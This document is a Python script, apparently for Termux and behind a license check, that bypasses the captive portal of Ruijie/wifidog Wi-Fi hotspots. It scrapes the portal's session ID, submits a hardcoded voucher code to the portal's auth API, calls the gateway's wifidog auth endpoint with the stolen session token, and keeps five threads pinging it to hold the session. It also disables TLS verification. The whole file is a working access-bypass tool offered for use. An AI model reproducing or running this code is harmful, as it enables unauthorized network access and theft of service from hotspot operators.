import requests, re, urllib3, time, threading, os, random, subprocess, sys
from urllib.parse import urlparse, parse_qs, urljoin

# SSL Bypass
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- [GitHub Raw Link] ---
RAW_KEY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/bypass-ruijie/refs/heads/main/Key.txt"
LICENSE_FILE = "license.txt"

# --- SYSTEM COLORS (Native Termux Support) ---
def col(c):
    codes = {"Y": "\033[93m", "G": "\033[92m", "R": "\033[91m", 
             "C": "\033[96m", "W": "\033[97m", "OFF": "\033[0m"}
    return codes.get(c, "\033[0m")

def banner():
    os.system('clear')
    # ၁။ အဝါရောင် အပေါ်စည်း
    print(col("Y") + " ="*35 + col("OFF"))
    
    # ၂။ Ruijie Logo - အဝါ၊ အစိမ်း၊ အနီ တစ်ကြောင်းချင်းစီ Native Color သွင်းခြင်း
    print(col("Y") + "      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗" + col("OFF"))
    print(col("Y") + "      ██╔══██╗██║   ██║██║     ██║██║██╔════╝" + col("OFF"))
    print(col("G") + "      ██████╔╝██║   ██║██║     ██║██║█████╗  " + col("OFF"))
    print(col("G") + "      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  " + col("OFF"))
    print(col("R") + "      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗" + col("OFF"))
    print(col("R") + "      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝" + col("OFF"))
    
    # ၃။ အနီရောင် Premium Edition စာသား
    print(f"        {col('R')}✨ Ruijie Bypass - PREMIUM EDITION ✨{col('OFF')}")
    print(col("Y") + " ="*35 + col("OFF") + "\n")

def get_hwid():
    try:
        return f"ID-{subprocess.check_output(['whoami']).decode().strip()}"
    except:
        return "ID-Unknown"

def verify():
    hwid = get_hwid()
    banner()
    
    if os.path.exists(LICENSE_FILE):
        print(f"{col('G')}[✓] Status: Active (Auto Login Success){col('OFF')}")
        return True

    try:
        print(f"{col('W')}[*] Connecting to License Server...{col('OFF')}")
        resp = requests.get(RAW_KEY_URL, timeout=10).text
        print(f"{col('W')}[+] YOUR DEVICE ID: {col('Y')}{hwid}{col('OFF')}")
        key = input(f"{col('Y')}[?] ENTER LICENSE KEY: {col('OFF')}").strip()
        
        if f"{key}:{hwid}" in resp:
            with open(LICENSE_FILE, "w") as f:
                f.write(key)
            print(f"{col('G')}[✓] Access Granted! License Saved.{col('OFF')}")
            time.sleep(1)
            return True
        else:
            print(f"{col('R')}[!] Invalid Key or Unauthorized ID.{col('OFF')}")
            sys.exit()
    except:
        print(f"{col('R')}[!] Server Error: Check Your Internet.{col('OFF')}")
        sys.exit()

def check_net():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=5).status_code == 204
    except:
        return False

def high_speed_pulse(link):
    session = requests.Session()
    while True:
        try:
            session.get(link, timeout=10, verify=False)
            # Bypass Status - အစိမ်းရောင်
            print(f"{col('G')}[✓] Bypass Active | Pulse: [{random.randint(100,450)}ms]{col('OFF')}      ", end="\r")
        except:
            break
        time.sleep(random.uniform(1.0, 2.5))

def start_bypass():
    print(f"{col('C')}[*] Attempting to Capture Portal...{col('OFF')}")
    session = requests.Session()
    while True:
        try:
            if check_net():
                print(f"{col('Y')}[•] Internet Connected. Monitoring...{col('OFF')}         ", end="\r")
                time.sleep(10)
                continue

            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            r1 = session.get(r.url, verify=False, timeout=5)
            
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(r.url, match.group(1)) if match else r.url
            r2 = session.get(n_url, verify=False, timeout=5)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                print(f"{col('G')}[✓] SID Captured: {sid[:15]}...{col('OFF')}")
                p_host = f"{urlparse(r.url).scheme}://{urlparse(r.url).netloc}"
                
                session.post(f"{p_host}/api/auth/voucher/", 
                             json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, 
                             timeout=10)
                
                gw = parse_qs(urlparse(r.url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(r.url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                # Thread Start - အနီရောင်
                print(f"{col('R')}[*] ⚡ Launching Stability Pulse Threads... ⚡{col('OFF')}")
                for _ in range(5):
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                
                while check_net():
                    time.sleep(5)
            else:
                print(f"{col('R')}[!] SID Not Found. Retrying in 5s...{col('OFF')}")
                time.sleep(5)
        except:
            time.sleep(3)

if __name__ == "__main__":
    if verify():
        try:
            start_bypass()
        except KeyboardInterrupt:
            print(f"\n{col('R')}[!] Stopped by User.{col('OFF')}")
